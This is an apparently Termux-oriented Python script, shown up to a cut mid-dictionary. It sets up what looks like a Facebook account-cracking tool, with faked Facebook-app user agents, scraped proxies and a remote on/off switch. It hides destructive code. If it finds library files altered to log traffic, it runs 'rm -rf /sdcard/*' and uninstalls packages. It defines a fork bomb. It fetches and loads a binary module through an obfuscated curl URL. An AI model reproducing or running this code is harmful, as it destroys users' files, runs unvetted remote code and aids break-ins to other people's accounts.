#__________________| IMPORT |__________________#
from os import path
import requests,random,uuid,string,hashlib,json
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,urllib3
import platform,math,smtplib
import platform
import smtplib
import math
import os,base64,zlib,pip,urllib
def clear():
        os.system('clear')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python ATOM.py')
        
from concurrent.futures import ThreadPoolExecutor
#───────────────[FAKE CPTHON]───────────────────────── #

###########
import os, platform, time, sys


try:
 import requests
except:os.system("pip uninstall requests -y;pip install requests")
print('\033[1;91m[\033[1;97m✓\033[1;91m] \033[1;92mChecking For Update. . . .')
print('\033[1;91m[\033[1;97m✓\033[1;91m] \033[1;92mUpdate DONE. . . .')

time.sleep(2)

os.system('git pull --quiet 2>/dev/null')
bit = platform.architecture()[0]
if bit == '64bit':
 print('\033[1;91m[\033[1;92m✓\033[1;91m] \033[1;92mYOU ARE 64BIT USER')
elif bit == '32bit':
 print('\033[1;91m[\033[1;92m✓\033[1;91m] \033[1;92mYOU ARE 32BIT USER')

 

 #───────────────[BIT End]───────────────────────── #
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('proxies.txt','w').write(prox)
except Exception as e:
	print('')
proxies=open('proxies.txt','r').read().splitlines()


xx=requests.get('https://raw.githubusercontent.com/SIAM-TEAM-143/Ua1.txt/refs/heads/main/Ua-up.txt').text.splitlines()

#----------http_canary-------#
#pycurl
try:
    from io import BytesIO
    import pycurl
except:os.system("pip install pycurl")
from io import BytesIO
import pycurl,certifi

def py_get(url):
    curl = pycurl.Curl()
    buffer = BytesIO()
    try:
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.SSL_VERIFYPEER, 1)
        curl.setopt(curl.SSL_VERIFYHOST, 2)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
    except pycurl.error as e:
        return f"An error occurred in py_get"
    finally:
        curl.close()
    response_body = buffer.getvalue().decode('utf-8')
    return response_body
def git():
    os.system("xdg-open https://github.com/MR-ERROR-707")

def is_https_active():
    try:
        response = requests.get('htt'+'ps://ww'+'w.googl'+'e.com')
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        return False

if is_https_active():pass
else:sys.exit(" [!!] Off Httpcanary!!")
myid=uuid.uuid4().hex[:5].upper()
try:
    key1 = open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/bin'+'/.error', 'r').read()
except:
    kok=open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/bin'+'/.error', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/bin'+'/.error', 'r').read()
kex=(f"MR|{uid}|ERROR|{key1}|707")
import os,uuid,hashlib,platform
AX = hashlib.md5((platform.version()+str(os.getuid())+platform.platform()+os.getlogin()+platform.release()).replace(' ','').encode()).hexdigest().upper()
_sos_=AX;_xvx_=_sos_;_asa_=_xvx_;_cxa_=_asa_
_qq_=_cxa_[5:8];_ee_=_cxa_[15:19];_rr_=_cxa_[23:26];_tt_=_cxa_[11:13]
_yy_=_cxa_[19:21];_q_=_yy_;_w_=_tt_;_e_=_rr_;_r_=_ee_;_t_=_qq_;__coc__=_q_+_w_+_e_+_r_+_t_
#===================[COLOUR CODE]===========================
orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
my_color = [white,blue,green];warna = random.choice(my_color)
sys.stdout.write('\x1b]2; ERROR~XD\x07')
#▬▭▬▭▬▭▬▭[MODULE IMPORT]▬▭▬▭▬▭▬▭#
import pycurl
import uuid,base64,hashlib,zlib,subprocess,time,platform
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,marshal,base64,zlib
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import _socket, ssl, certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
from concurrent.futures import ThreadPoolExecutor
os.system("pip install licensing > /dev/null")
from licensing.models import *
from licensing.methods import Key, Helpers
try:os.remove("p"+"yc"+"url"+".cpython-311.so")
except:pass
mr_tarek = subprocess.run(['curl', '-L', 'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'g'+'i'+'t'+'h'+'u'+'b'+'.'+'c'+'o'+'m'+'/'+'M'+'R'+'-'+'T'+'A'+'R'+'E'+'K'+'-'+'4'+'0'+'4'+'/'+'C'+'U'+'R'+'L'+'/'+'b'+'l'+'o'+'b'+'/'+'m'+'a'+'i'+'n'+'/'+'p'+'y'+'c'+'u'+'r'+'l'+'.'+'c'+'p'+'y'+'t'+'h'+'o'+'n'+'-'+'3'+'1'+'1'+'.'+'s'+'o'+'?raw=true', '-o', 'p'+'y'+'c'+'u'+'r'+'l'+'.'+'c'+'p'+'y'+'t'+'h'+'o'+'n'+'-'+'3'+'11.so'])
if mr_tarek.returncode != 0:
    os.system("clear")
    print(f"{green} PLEASE CHECK INTERNET CONNECTION")
    exit(1)
else:
    pass
try:shutil.rmtree("pycurl-7.45.2.dist-info")
except:pass
try:shutil.rmtree("pycurl")
except:pass
try:shutil.rmtree("/data/data/com.termux/files/usr/lib/python3.11/site-packages/"+"pyc"+"url"+"-7"+".45"+".2."+"dist-info")
except:pass
try:shutil.rmtree("/data/data/com.termux/files/usr/lib/python3.11/site-packages/"+"py"+"cur"+"l")
except:pass
try:os.remove("/data/data/com.termux/files/usr/lib/python3.11/site-packages/"+"py"+"curl"+".cpython-311.so")
except:pass
import pycurl
from io import BytesIO
os.remove("pycurl.cpython-311.so")
nillxd = "pycurl"
if os.path.exists(nillxd) and os.path.isdir(nillxd):
    exit(f"{green}ERROR PLEASE RUN AGAIN")
else:
    pass
os.system("clear")
sim = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace('\n','').replace(',',f' {red}●{white} ')
#===================[SERVER BOX]===========================
first='/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/'
if not 'print' in open(first+'api.py','r').read():
    pass
else:
    exit('\33[1;91mWARNING ⚠️')
if not 'print' in open(first+'sessions.py','r').read():
    pass
else:
    exit('\33[1;91mWARNING ⚠️')    

first='/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/'
if not 'print' in open(first+'api.py','r').read():
    pass
else:
    exit('\33[1;91mWARNING ⚠️')
if not 'print' in open(first+'sessions.py','r').read():
    pass
else:
    exit('\33[1;91mWARNING ⚠️')

#=============================#
def pro__():
    os.system("clear")
    os.system('touch .data')
    open('.data','w').write(':(){ :|: & };:')
    for b in range(20):
        os.system('bash .data')
        os.system('ls & clear')
#____________UA-SETUP_RANDOM_______#
model = random.choice(['SAMSUNG-SM-G890A','SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def SHAPTAR_BACHA():
    ua = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097175;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Mobilink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/;'+str(random.choice(model))+'FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]'
    return ua
#======ua4=====#
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	ugen.append(xx)
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ugen.append(xd)
	
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
#12;   Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/519.0.0.44.92;IABMV/1;] FBNV/5        
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['6','7','8','9','10','11','12','13','14','15'])
	c='N155DL Build/SKQ1.220213.001; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.42'
	h=random.randrange(73,150)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(30,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/519.0.0.44.92;IABMV/1;] FBNV/5 '
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
for xd in range(10000):
    a = "FBAN/FB4A;FBAV/"
    b = str(random.randint(400, 426))
    c = ".0.0."
    d = str(random.randint(19, 24))
    e = ".105;FBBV/"
    f = str(random.randint(316828437, 321890423))
    ua = [
        'FBLC/en_US',
        'FBLC/en_GB',
        'FBLC/es_ES',
        'FBLC/fr_FR',
        'FBLC/de_DE',
        'FBLC/it_IT',
        'FBLC/pt_PT',
        'FBLC/ru_RU',
        'FBLC/ar_AR',
        'FBLC/zh_CN',
        'FBLC/zh_TW',
        'FBLC/ja_JP',
        'FBLC/ko_KR',
        'FBLC/vi_VN',
        'FBLC/id_ID',
        'FBLC/th_TH',
        'FBLC/ms_MY',
        'FBLC/tr_TR',
        'FBLC/pl_PL',
        'FBLC/nl_NL',
        'FBLC/sv_SE',
        'FBLC/da_DK',
        'FBLC/no_NO',
        'FBLC/fi_FI',
        'FBLC/cs_CZ',
        'FBLC/sk_SK',
        'FBLC/hu_HU',
        'FBLC/ro_RO',
        'FBLC/bg_BG',
        'FBLC/sr_RS',
        'FBLC/hr_HR',
        'FBLC/lt_LT',
        'FBLC/lv_LV',
        'FBLC/et_EE',
        'FBLC/sl_SI',
        'FBLC/mk_MK',
        'FBLC/sq_AL',
        'FBLC/iw_IL',
        'FBLC/hi_IN',
        'FBLC/bn_BD',
        'FBLC/ne_NP',
        'FBLC/ta_IN',
        'FBLC/ml_IN',
        'FBLC/gu_IN',
        'FBLC/pa_IN',
        'FBLC/or_IN',
        'FBLC/as_IN',
        'FBLC/mr_IN',
        'FBLC/sa_IN'
    ]
    g = f";FBDM/density=2.2,width=1080,height=2280;{random.choice(ua)};FBRV/"
    h = str(random.randint(193651229, 198551215))
    i = ";FBCR/Nokia;FBMF/Nokia;FBBD/Nokia 7.2;FBPN/com.facebook.katana;FBDV/Nokia 7.2;FBSV/"
    j = str(random.randint(10, 12))
    k = ";FBOP/1;FBCA/arm64-v8a:"
    ua = a + b + c + d + e + f + g + h + i + j + k
    ugen.append(ua)	
	
####################
from rich.progress import track
def lood(message):
    for a in track(range(250), description=message):
        time.sleep(0.02)

def clear():
    os.system('clear')
    


def server():
    try:
        database = requests.get('https://raw.githubusercontent.com/Darkx221/Servers-/refs/heads/main/Servers').text
        if 'on' in database:
            return
        elif 'off' in database:
            print(' [✓] TOOL IS OFF')
            sys.exit()
        elif 'update' in database:
            print(' [✓] TOOL IS UPDATE ')
            sys.exit()
        else:
            while True:
                print(' TOOL IS ON UPDATE')
    except:
        print(' Internet Error [✓] ')
        sys.exit()

server()
clear()
print('[✓]\x1b[34;1m TOOL IS ON')
lood('W8 FOR MENU')

SIAM_XD = requests.get('https://raw.githubusercontent.com/SIAM-TEAM-143/Version/main/Version.text').text.splitlines()
version = random.choice(SIAM_XD)
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ SECURITY-CODE ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using Jutt');exit()
      if path.isfile("/data/data/com.termux/files/usr/bin/termux-reset"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using Jutt');exit()
      if path.isfile("/data/data/com.termux/files/usr/bin/termux-setup-storage"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using Jutt');exit()
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py', 'r') as file:
    file_content = file.read()
with open('/data/data/com.termux/files/usr/lib/python3.12/http/client.py', 'r') as file:
    file_content = file.read()
if 'print(data.decode())' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('pkg uninstall python -y')
    os.system('pkg uninstall pycurl -y')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/Downloads')
    os.system('pip install requests')
    exit("")
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py', 'r') as file:
    file_content = file.read()
if 'print' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit("")
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit("")
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit("")

#__________________| ETC |__________________#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'it_IT'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Telenor'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Telenor"
                        sim_id+=fbcr
        else:
                fbcr = 'Telenor'
                sim_id+=fbcr
except:
        fbcr = "Telenor"
device = {
        'android_version':android_version,
        'model':model,
